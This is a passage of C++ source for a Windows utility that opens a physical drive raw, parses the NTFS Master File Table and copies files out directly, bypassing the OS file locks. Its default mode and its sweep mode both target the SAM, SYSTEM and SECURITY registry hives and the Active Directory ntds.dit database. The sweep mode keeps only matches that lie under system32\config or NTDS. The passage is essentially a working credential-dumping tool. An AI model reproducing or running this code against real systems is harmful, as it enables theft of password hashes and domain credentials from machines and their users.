            ULONGLONG toCopy = min(bytes, realSize - copied);
            memcpy(alData.data() + copied, buf.data(), (size_t)toCopy);
            copied += toCopy;
            if (copied >= realSize) break;
        }
    }

    // Walk attribute list entries, collect unique extension MFT reference numbers that hold $DATA
    struct AL_ENTRY_HEADER {
        DWORD Type;
        WORD  RecordLength;
        BYTE  NameLength;
        BYTE  NameOffset;
        ULONGLONG StartVCN;
        ULONGLONG MFTReference; // low 48 bits = MFT entry number
        WORD  AttributeID;
    };

    vector<ULONGLONG> extensionRecords;
    SIZE_T pos = 0;
    while (pos + sizeof(AL_ENTRY_HEADER) <= alData.size()) {
        const AL_ENTRY_HEADER* e = (const AL_ENTRY_HEADER*)(alData.data() + pos);
        if (e->RecordLength == 0) break;
        if (e->Type == ATTR_TYPE_DATA) {
            ULONGLONG ref = e->MFTReference & 0x0000FFFFFFFFFFFFULL;
            if (ref != 0) {
                bool already = false;
                for (auto r : extensionRecords) if (r == ref) { already = true; break; }
                if (!already) extensionRecords.push_back(ref);
            }
        }
        pos += e->RecordLength;
    }

    // We need *some* runs to bootstrap reading extension records. If base record already gave us
    // runs that cover entry 0, we can use them. Otherwise fall back to reading extension records
    // via contiguous assumption from MFT_LCN.
    vector<DataRun> bootstrapRuns = accumRuns;
    if (bootstrapRuns.empty()) {
        DataRun r;
        r.vcn_start = 0;
        r.length_clusters = 0xFFFFFFFF;
        r.absolute_lcn = (LONGLONG)g_MFT_LCN;
        bootstrapRuns.push_back(r);
    }

    for (ULONGLONG extRef : extensionRecords) {
        if (extRef == 0) continue;
        vector<BYTE> extRec((size_t)record_size);
        if (!ReadMFTRecordViaRuns(hDisk, bootstrapRuns, extRef, record_size, extRec.data())) {
            printf("  [!] Failed to read $MFT extension record %llu\n", extRef);
            continue;
        }
        const MFT_ENTRY_HEADER* eh = (const MFT_ENTRY_HEADER*)extRec.data();
        if (eh->Signature != MFT_SIGNATURE) continue;

        WORD o = eh->FirstAttributeOffset;
        while (o + sizeof(ATTRIBUTE_HEADER) < rec_size_t) {
            const ATTRIBUTE_HEADER* a = (const ATTRIBUTE_HEADER*)(extRec.data() + o);
            if (a->Length == 0) break;
            if (a->AttributeType == ATTR_TYPE_END) break;
            if (a->AttributeType == ATTR_TYPE_DATA && a->NonResident != 0) {
                MergeDataRunsFromAttr(extRec.data(), o, record_size, accumRuns);
            }
            o += a->Length;
        }
    }

    if (accumRuns.empty()) return false;

    // Sort by vcn_start just in case extension records returned them out of order
    std::sort(accumRuns.begin(), accumRuns.end(),
        [](const DataRun& a, const DataRun& b) { return a.vcn_start < b.vcn_start; });

    g_MFT_Runs = accumRuns;

    ULONGLONG totalClusters = 0;
    for (const auto& r : g_MFT_Runs) totalClusters += r.length_clusters;
    printf("  [+] $MFT runlist: %zu run(s) covering %llu clusters (~%.2f MB, ~%llu entries max)\n",
        g_MFT_Runs.size(), totalClusters,
        (totalClusters * g_ClusterSize) / (1024.0 * 1024.0),
        (totalClusters * g_ClusterSize) / record_size);
    return true;
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
ULONGLONG GetLBAFromDriveLetter(const char* driveLetterWithColon) {
    char volumePath[10];
    // Creates a path like "\\.\C:"
    sprintf_s(volumePath, sizeof(volumePath), "\\\\.\\%s", driveLetterWithColon);

    HANDLE hVolume = CreateFileA(
        volumePath,
        0, // No access needed, we just need the handle for DeviceIoControl
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );

    if (hVolume == INVALID_HANDLE_VALUE) {
        printf("[-] Could not open volume %s. Error: %lu\n", volumePath, GetLastError());
        return 0;
    }

    VOLUME_DISK_EXTENTS diskExtents;
    DWORD bytesReturned = 0;

    bool success = DeviceIoControl(
        hVolume,
        IOCTL_VOLUME_GET_VOLUME_DISK_EXTENTS,
        NULL,
        0,
        &diskExtents,
        sizeof(diskExtents),
        &bytesReturned,
        NULL
    );

    CloseHandle(hVolume);

    if (!success) {
        printf("[-] DeviceIoControl failed for %s. Error: %lu\n", volumePath, GetLastError());
        return 0;
    }

    if (diskExtents.NumberOfDiskExtents == 0) {
        printf("[-] No disk extents found for volume %s.\n", volumePath);
        return 0;
    }

    // We assume the volume is on the first extent (most common case)
    // And that the physical drive is PhysicalDrive0. A more robust tool would check diskExtents.Extents[0].DiskNumber
    printf("  [+] Volume %s is on Disk %lu\n", volumePath, diskExtents.Extents[0].DiskNumber);

    // The starting LBA is the physical byte offset divided by the sector size (usually 512)
    ULONGLONG startingLBA = diskExtents.Extents[0].StartingOffset.QuadPart / g_BytesPerSector;
    return startingLBA;
}


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

bool DetectNTFSParameters(HANDLE hDisk, ULONGLONG cDriveStartLBA) {
    BYTE boot_sector[512];
    LARGE_INTEGER offset;
    offset.QuadPart = cDriveStartLBA * 512;
    SetFilePointerEx(hDisk, offset, NULL, FILE_BEGIN);

    DWORD bytesRead;
    if (!ReadFile(hDisk, boot_sector, 512, &bytesRead, NULL)) {
        printf("[-] Failed to read boot sector\n");
        return false;
    }

    if (memcmp(boot_sector + 3, "NTFS    ", 8) != 0) {
        printf("[-] Not an NTFS partition\n");
        return false;
    }

    const NTFS_BOOT_SECTOR* bs = (const NTFS_BOOT_SECTOR*)boot_sector;

    g_SectorsPerCluster = bs->SectorsPerCluster;
    g_MFT_LCN = bs->MFT_LCN;
    g_ClusterSize = bs->BytesPerSector * g_SectorsPerCluster;

    return true;
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

bool ExtractFile(HANDLE hDisk, ULONGLONG entry_number, const char* output_filename) {
    printf("\n[Extracting File from MFT Entry %llu]\n", entry_number);


    vector<BYTE> mft_entry(g_MFTEntrySize);

    ULONGLONG byte_offset_in_mft = entry_number * g_MFTEntrySize;
    ULONGLONG vcn = byte_offset_in_mft / g_ClusterSize;
    ULONGLONG offset_in_cluster = byte_offset_in_mft % g_ClusterSize;

    bool found = false;
    for (size_t i = 0; i < g_MFT_Runs.size(); i++) {
        const DataRun& run = g_MFT_Runs[i];
        ULONGLONG vcn_end = run.vcn_start + run.length_clusters;

        if (vcn >= run.vcn_start && vcn < vcn_end) {
            ULONGLONG vcn_offset = vcn - run.vcn_start;
            ULONGLONG lcn = run.absolute_lcn + vcn_offset;
            ULONGLONG physical_lba = g_CDriveStartLBA + (lcn * g_SectorsPerCluster);
            ULONGLONG physical_offset = (physical_lba * 512) + offset_in_cluster;

            LARGE_INTEGER seek_offset;
            seek_offset.QuadPart = physical_offset;
            SetFilePointerEx(hDisk, seek_offset, NULL, FILE_BEGIN);

            DWORD bytesRead;
            if (!ReadFile(hDisk, mft_entry.data(), (DWORD)g_MFTEntrySize, &bytesRead, NULL)) {
                printf("[-] Failed to read MFT entry\n");
                return false;
            }
            found = true;
            break;
        }
    }

    if (!found) {
        printf("[-] VCN %llu not found in MFT data runs\n", vcn);
        return false;
    }

    if (!ApplyFixupToMFTRecord(mft_entry.data(), g_MFTEntrySize)) {
        printf("[!] Warning: Fixup failed, continuing anyway\n");
    }

    MFT_ENTRY_HEADER* header = (MFT_ENTRY_HEADER*)mft_entry.data();

    if (header->Signature != MFT_SIGNATURE) {
        printf("[-] Invalid MFT signature: 0x%08X (expected 0x%08X)\n", header->Signature, MFT_SIGNATURE);
        return false;
    }

    printf("[+] Valid MFT entry\n");

    DWORD offset = header->FirstAttributeOffset;

    while (offset < g_MFTEntrySize && offset > 0) {
        const ATTRIBUTE_HEADER* attr = (const ATTRIBUTE_HEADER*)(mft_entry.data() + offset);

        if (attr->AttributeType == ATTR_TYPE_END || attr->Length == 0) break;

        if (attr->AttributeType == ATTR_TYPE_DATA) {
            printf("[+] Found $DATA attribute\n");

            if (attr->NonResident == 1) {

                const NON_RESIDENT_ATTRIBUTE* nonres_attr = (const NON_RESIDENT_ATTRIBUTE*)(mft_entry.data() + offset + sizeof(ATTRIBUTE_HEADER));

                ULONGLONG real_size = nonres_attr->RealSize;
                ULONGLONG allocated_size = nonres_attr->AllocatedSize;

                printf("    File size: %llu bytes (%.2f KB)\n", real_size, real_size / 1024.0);
                printf("    Allocated: %llu bytes\n", allocated_size);

                if (allocated_size > MAX_FILE_SIZE) {
                    printf("[-] File too large: %llu bytes (limit: %llu bytes)\n", allocated_size, MAX_FILE_SIZE);
                    return false;
                }

                const BYTE* data_runs = mft_entry.data() + offset + nonres_attr->DataRunsOffset;
                vector<DataRun> runs = ParseDataRuns(data_runs, g_MFTEntrySize - (offset + nonres_attr->DataRunsOffset));

                if (runs.empty()) {
                    printf("[-] No data runs found\n");
                    return false;
                }

                printf("    Found %zu data run(s)\n", runs.size());

                vector<BYTE> file_buffer((size_t)allocated_size);
                ULONGLONG buffer_offset = 0;

                for (size_t i = 0; i < runs.size(); i++) {
                    LONGLONG lcn = runs[i].absolute_lcn;
                    ULONGLONG num_clusters = runs[i].length_clusters;
                    ULONGLONG cluster_bytes = num_clusters * g_ClusterSize;

                    if (lcn == 0) {
                        printf("    Run #%zu: SPARSE, Length=%llu clusters (%llu bytes) - filling with zeros\n",
                            i + 1, num_clusters, cluster_bytes);
                        memset(file_buffer.data() + buffer_offset, 0, (size_t)cluster_bytes);
                        buffer_offset += cluster_bytes;
                        continue;
                    }

                    printf("    Run #%zu: LCN=%lld, Length=%llu clusters (%llu bytes)\n",
                        i + 1, lcn, num_clusters, cluster_bytes);

                    ULONGLONG physical_lba = g_CDriveStartLBA + (lcn * g_SectorsPerCluster);
                    ULONGLONG physical_offset = physical_lba * g_BytesPerSector;

                    LARGE_INTEGER seek_offset;
                    seek_offset.QuadPart = physical_offset;

                    if (!SetFilePointerEx(hDisk, seek_offset, NULL, FILE_BEGIN)) {
                        printf("    [-] Failed to seek\n");
                        return false;
                    }

                    ULONGLONG remaining = cluster_bytes;
                    const DWORD MAX_READ_CHUNK = 0x10000000;

                    while (remaining > 0) {
                        DWORD to_read = (remaining > MAX_READ_CHUNK) ? MAX_READ_CHUNK : (DWORD)remaining;
                        DWORD bytes_read = 0;

                        if (!ReadFile(hDisk, file_buffer.data() + buffer_offset, to_read, &bytes_read, NULL)) {
                            printf("    [-] Failed to read at offset %llu\n", buffer_offset);
                            return false;
                        }

                        buffer_offset += bytes_read;
                        remaining -= bytes_read;

                        if (bytes_read != to_read) {
                            printf("    [-] Incomplete read: expected %lu, got %lu\n", to_read, bytes_read);
                            return false;
                        }
                    }
                }

                FILE* out = fopen(output_filename, "wb");
                if (!out) {
                    printf("[-] Failed to create output file\n");
                    return false;
                }

                fwrite(file_buffer.data(), 1, (size_t)real_size, out);
                fclose(out);

                printf("\n[SUCCESS] Saved to %s (%llu bytes)\n", output_filename, real_size);
                return true;
            }
            else {
                const RESIDENT_ATTRIBUTE* res_attr = (const RESIDENT_ATTRIBUTE*)(mft_entry.data() + offset + sizeof(ATTRIBUTE_HEADER));
                DWORD value_len = res_attr->ValueLength;
                const BYTE* data = mft_entry.data() + offset + res_attr->ValueOffset;

                FILE* out = fopen(output_filename, "wb");
                if (!out) {
                    printf("[-] Failed to create output file\n");
                    return false;
                }

                fwrite(data, 1, value_len, out);
                fclose(out);

                printf("\n[SUCCESS] Saved to %s (%u bytes, resident)\n", output_filename, value_len);
                return true;
            }
        }

        offset += attr->Length;
    }

    printf("[-] $DATA attribute not found\n");
    return false;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

bool GetPartitionInfoFromDriveLetter(const char* driveLetterWithColon, DWORD* outDiskNumber, ULONGLONG* outStartingLBA) {
    char volumePath[10];
    sprintf_s(volumePath, sizeof(volumePath), "\\\\.\\%s", driveLetterWithColon);

    HANDLE hVolume = CreateFileA(volumePath, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hVolume == INVALID_HANDLE_VALUE) {
        printf("[-] Could not open volume %s. Error: %lu\n", volumePath, GetLastError());
        return false;
    }

    VOLUME_DISK_EXTENTS diskExtents;
    DWORD bytesReturned = 0;
    bool success = DeviceIoControl(hVolume, IOCTL_VOLUME_GET_VOLUME_DISK_EXTENTS, NULL, 0, &diskExtents, sizeof(diskExtents), &bytesReturned, NULL);
    CloseHandle(hVolume);

    if (!success) {
        printf("[-] DeviceIoControl failed for %s. Error: %lu\n", volumePath, GetLastError());
        return false;
    }

    if (diskExtents.NumberOfDiskExtents == 0) {
        printf("[-] No disk extents found for volume %s.\n", volumePath);
        return false;
    }


    *outDiskNumber = diskExtents.Extents[0].DiskNumber;

    *outStartingLBA = diskExtents.Extents[0].StartingOffset.QuadPart / 512;

    return true;
}


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

string NormalizePath(const string& path) {
    string result = path;

    std::replace(result.begin(), result.end(), '/', '\\');

    std::transform(result.begin(), result.end(), result.begin(),
        [](unsigned char c) { return std::tolower(c); });
    return result;
}

static void SweepDiskForFilenames(DWORD diskNum, const vector<string>& filenames) {
    char physical_drive_path[64];
    sprintf_s(physical_drive_path, sizeof(physical_drive_path), "\\\\.\\PhysicalDrive%lu", diskNum);
    HANDLE hDisk = CreateFileA(physical_drive_path, GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hDisk == INVALID_HANDLE_VALUE) {
        printf("[!] Could not open %s. Error: %lu\n", physical_drive_path, GetLastError());
        return;
    }
    printf("[+] Sweep mode: opened %s\n", physical_drive_path);

    vector<NtfsPartition> parts = EnumerateNTFSPartitions(hDisk);
    if (parts.empty()) {
        printf("[-] No NTFS partitions found on disk %lu\n", diskNum);
        CloseHandle(hDisk);
        return;
    }
    printf("[+] Found %zu NTFS partition(s) on disk %lu\n", parts.size(), diskNum);

    for (const auto& part : parts) {
        printf("\n[+] Scanning partition [%s] idx=%d LBA=%llu\n",
            part.Source.c_str(), part.Index, part.StartLBA);

        g_MFTCache.clear();
        g_MFT_Runs.clear();
        g_CDriveStartLBA = part.StartLBA;

        if (!DetectNTFSParameters(hDisk, g_CDriveStartLBA)) continue;
        NTFS_BOOT_SECTOR boot;
        if (!ReadBootSector(hDisk, g_CDriveStartLBA, boot)) continue;
        g_BytesPerSector = boot.BytesPerSector;
        g_SectorsPerCluster = boot.SectorsPerCluster;
        g_ClusterSize = g_BytesPerSector * g_SectorsPerCluster;
        g_MFT_LCN = boot.MFT_LCN;
        g_MFTEntrySize = GetMFTRecordSizeFromClusters(boot.ClustersPerMFTRecord, g_BytesPerSector, g_SectorsPerCluster);

        if (!BuildMFTRunlistFromEntry0(hDisk, g_MFTEntrySize)) {
            printf("[!] Could not build MFT runlist for this partition.\n");
            continue;
        }

        ULONGLONG totalMftClusters = 0;
        for (const auto& r : g_MFT_Runs) totalMftClusters += r.length_clusters;
        ULONGLONG maxEntriesFromMft = (totalMftClusters * g_ClusterSize) / g_MFTEntrySize;
        const ULONGLONG MAX_ENTRIES = maxEntriesFromMft > 0 ? maxEntriesFromMft : 500000ULL;
        printf("  [+] Will scan up to %llu MFT entries\n", (ULONGLONG)MAX_ENTRIES);
        vector<BYTE> recBuf((size_t)g_MFTEntrySize);
        vector<string> remaining = filenames;

        ULONGLONG readFailures = 0, validEntries = 0, inUseEntries = 0;
        for (ULONGLONG i = 5; i < MAX_ENTRIES && !remaining.empty(); i++) {
            if ((i & 0x1FFFF) == 0 && i > 5) {
                printf("    ... scanned %llu entries (valid=%llu in-use=%llu read-fail=%llu)\n",
                    i, validEntries, inUseEntries, readFailures);
            }
            if (!ReadMFTEntryUsingRunlist(hDisk, (ULONGLONG)i, recBuf.data(), g_MFTEntrySize)) { readFailures++; continue; }
            MFTEntryInfo info = ParseMFTEntry(recBuf.data(), g_MFTEntrySize);
            if (!info.valid) continue;
            validEntries++;
            bool isInUse = (((MFT_ENTRY_HEADER*)recBuf.data())->Flags & 0x01) != 0;
            if (!isInUse) continue;
            inUseEntries++;

            for (auto it = remaining.begin(); it != remaining.end(); ) {
                // Case-insensitive filename compare
                string a = info.filename, b = *it;
                std::transform(a.begin(), a.end(), a.begin(), ::tolower);
                std::transform(b.begin(), b.end(), b.begin(), ::tolower);

                if (a == b) {
                    string full = ReconstructPath(hDisk, (ULONGLONG)i, g_MFTEntrySize);
                    string fullLower = full;
                    std::transform(fullLower.begin(), fullLower.end(), fullLower.begin(), ::tolower);
                    bool plausible =
                        fullLower.find("\\windows\\system32\\config\\") != string::npos ||
                        fullLower.find("\\windows\\ntds\\") != string::npos;

                    if (!plausible) { ++it; continue; }

                    printf("\n[!!! MATCH on %s partition LBA=%llu] %s\n",
                        part.Source.c_str(), part.StartLBA, full.c_str());

                    string outName = "recovered_disk" + std::to_string(diskNum) +
                        "_part" + std::to_string(part.Index) +
                        "_" + *it;
                    ExtractFile(hDisk, (ULONGLONG)i, outName.c_str());
                    it = remaining.erase(it);
                }
                else {
                    ++it;
                }
            }
        }
    }

    CloseHandle(hDisk);
}

int main(int argc, char* argv[]) {

    // If you want to exctract some file or files.. use this!!!! :)
    vector<string> files_to_find_paths = {
        // "F:\\Windows\\NTDS\\ntds.dit"
    };

    //   newshit.exe --sweep <diskNumber> <filename1> [filename2...]
    //   newshit.exe --sweep 0 SAM SYSTEM SECURITY ntds.dit
    if (argc >= 4 && string(argv[1]) == "--sweep") {
        DWORD diskNum = (DWORD)atoi(argv[2]);
        vector<string> filenames;
        for (int i = 3; i < argc; i++) filenames.push_back(argv[i]);
        SweepDiskForFilenames(diskNum, filenames);
        printf("\n[+] Sweep complete.\n");
        return 0;
    }


    if (files_to_find_paths.empty()) {
        printf("[+] No specific files configured. Running in Default Mode.\n");
        files_to_find_paths.push_back("C:\\Windows\\System32\\config\\SAM");
        files_to_find_paths.push_back("C:\\Windows\\System32\\config\\SYSTEM");
        files_to_find_paths.push_back("C:\\Windows\\System32\\config\\SECURITY");
    }


    map<DWORD, vector<TargetFile>> targets_by_disk;
    for (const auto& path_str : files_to_find_paths) {
        if (path_str.length() < 2 || path_str[1] != ':') {
            printf("[!] Invalid path format: %s. Skipping.\n", path_str.c_str());
            continue;
        }
        TargetFile target;
        target.full_path = path_str;
        target.drive_letter = path_str.substr(0, 2);

        DWORD diskNum;
        ULONGLONG startingLBA;
        if (!GetPartitionInfoFromDriveLetter(target.drive_letter.c_str(), &diskNum, &startingLBA)) {
            printf("[-] Could not get info for drive %s. Skipping target '%s'.\n", target.drive_letter.c_str(), path_str.c_str());
            continue;
        }
        target.disk_number = diskNum;

        target.normalized_path = NormalizePath(path_str);
        fs::path p(path_str);
        target.filename = p.filename().string();
        target.output_filename = "recovered_" + target.filename;

        targets_by_disk[diskNum].push_back(target);
    }


    for (auto const& [diskNum, targets] : targets_by_disk) {

        char physical_drive_path[50];
        sprintf_s(physical_drive_path, sizeof(physical_drive_path), "\\\\.\\PhysicalDrive%lu", diskNum);
        HANDLE hDisk = CreateFileA(physical_drive_path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

        if (hDisk == INVALID_HANDLE_VALUE) {
            printf("[!] Could not open %s. Are you an admin? Error: %lu. Skipping all targets on this disk.\n", physical_drive_path, GetLastError());
            continue;
        }
        printf("[+] Successfully opened %s\n", physical_drive_path);

        const auto& representative_target = targets[0];

        ULONGLONG targetStartingLBA;
        DWORD tempDiskNum;
        if (!GetPartitionInfoFromDriveLetter(representative_target.drive_letter.c_str(), &tempDiskNum, &targetStartingLBA)) {
            printf("[-] Failed to re-verify partition info for %s. Skipping disk.\n", representative_target.drive_letter.c_str());
            CloseHandle(hDisk);
            continue;
        }

        g_CDriveStartLBA = targetStartingLBA;
        printf("[+] Analyzing partition %s at LBA %llu\n", representative_target.drive_letter.c_str(), g_CDriveStartLBA);


        if (!DetectNTFSParameters(hDisk, g_CDriveStartLBA)) { CloseHandle(hDisk); continue; }
        NTFS_BOOT_SECTOR boot;
        if (!ReadBootSector(hDisk, g_CDriveStartLBA, boot)) { CloseHandle(hDisk); continue; }
        g_BytesPerSector = boot.BytesPerSector;
        g_SectorsPerCluster = boot.SectorsPerCluster;
        g_ClusterSize = g_BytesPerSector * g_SectorsPerCluster;
        g_MFT_LCN = boot.MFT_LCN;
        g_MFTEntrySize = GetMFTRecordSizeFromClusters(boot.ClustersPerMFTRecord, g_BytesPerSector, g_SectorsPerCluster);
        if (!BuildMFTRunlistFromEntry0(hDisk, g_MFTEntrySize)) {
            printf("[!] Could not build MFT runlist for partition %s. Skipping.\n", representative_target.drive_letter.c_str());
            CloseHandle(hDisk);
            continue;
        }
        printf("[+] MFT analysis complete for partition %s.\n", representative_target.drive_letter.c_str());


        ULONGLONG totalMftClusters = 0;
        for (const auto& r : g_MFT_Runs) totalMftClusters += r.length_clusters;
        ULONGLONG maxEntriesFromMft = (totalMftClusters * g_ClusterSize) / g_MFTEntrySize;
        const ULONGLONG MAX_ENTRIES = maxEntriesFromMft > 0 ? maxEntriesFromMft : 500000ULL;
        printf("  [+] Will scan up to %llu MFT entries\n", (ULONGLONG)MAX_ENTRIES);
        vector<BYTE> recBuf((size_t)g_MFTEntrySize);
        vector<TargetFile> remaining_targets = targets;

        printf("[+] Starting MFT scan to find %zu target(s)...\n", remaining_targets.size());
        ULONGLONG readFailures = 0, validEntries = 0, inUseEntries = 0;
        for (ULONGLONG i = 5; i < MAX_ENTRIES && !remaining_targets.empty(); i++) {
            if ((i & 0x1FFFF) == 0 && i > 5) {
                printf("    ... scanned %llu entries (valid=%llu in-use=%llu read-fail=%llu)\n",
                    i, validEntries, inUseEntries, readFailures);
            }
            if (!ReadMFTEntryUsingRunlist(hDisk, (ULONGLONG)i, recBuf.data(), g_MFTEntrySize)) { readFailures++; continue; }
            MFTEntryInfo info = ParseMFTEntry(recBuf.data(), g_MFTEntrySize);
            if (!info.valid) continue;
            validEntries++;
            bool isInUse = (((MFT_ENTRY_HEADER*)recBuf.data())->Flags & 0x01) != 0;
            if (isInUse) inUseEntries++;


            for (auto it = remaining_targets.begin(); it != remaining_targets.end(); ) {
                TargetFile& target = *it;

                string fullpath = ReconstructPath(hDisk, (ULONGLONG)i, g_MFTEntrySize);
                if (fullpath.rfind("C:\\", 0) == 0) {
                    fullpath.replace(0, 2, target.drive_letter);
                }

                bool match_found = false;
                if (isInUse && NormalizePath(fullpath) == target.normalized_path) {
                    printf("\n[!!! EXACT PATH MATCH FOUND !!!]\n");
                    if (ExtractFile(hDisk, (ULONGLONG)i, target.output_filename.c_str())) { /*...*/ }
                    match_found = true;
                }
                else if (!isInUse && info.filename == target.filename) {
                    printf("\n[!!! DELETED FILE MATCH FOUND !!!]\n");
                    if (ExtractFile(hDisk, (ULONGLONG)i, target.output_filename.c_str())) { /*...*/ }
                    match_found = true;
                }

                if (match_found) {
                    it = remaining_targets.erase(it);
                }
                else {
                    ++it;
                }
            }
        }
        CloseHandle(hDisk);
    }

    printf("[+] Yalla Bye Baby\n");
    return 0;
}
